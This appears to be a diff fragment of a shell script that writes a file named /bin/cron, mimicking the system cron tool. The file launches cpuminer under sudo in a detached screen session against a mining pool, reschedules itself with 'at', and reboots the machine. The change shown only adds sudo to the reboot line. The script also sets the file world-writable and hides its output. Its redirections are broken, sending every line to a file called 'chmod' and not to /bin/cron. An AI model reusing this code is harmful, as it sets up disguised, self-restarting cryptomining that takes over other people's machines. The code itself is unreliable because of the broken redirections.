@@ -26,7 +26,7 @@ echo "[[ ${cpulimit} -gt "0" ]] && screen -dmS cpu cpulimit -e cpuminer -l ${cpu
 echo "sudo screen -dmS mining cpuminer -a ${algoritimo} -o stratum+tcp://${stratum}${walle}${eman} -t ${core} -R 30${coin}" >> chmod 777 /bin/cron
 echo "sleep ${rebo}m" >> chmod 777 /bin/cron
 echo "at -f /bin/cron now + 4 min" >> chmod 777 /bin/cron
-echo "reboot" >> chmod 777 /bin/cron
+echo "sudo reboot" >> chmod 777 /bin/cron
 sudo chmod 777 /bin/cron && bash /bin/cron & > /dev/null
 }
 
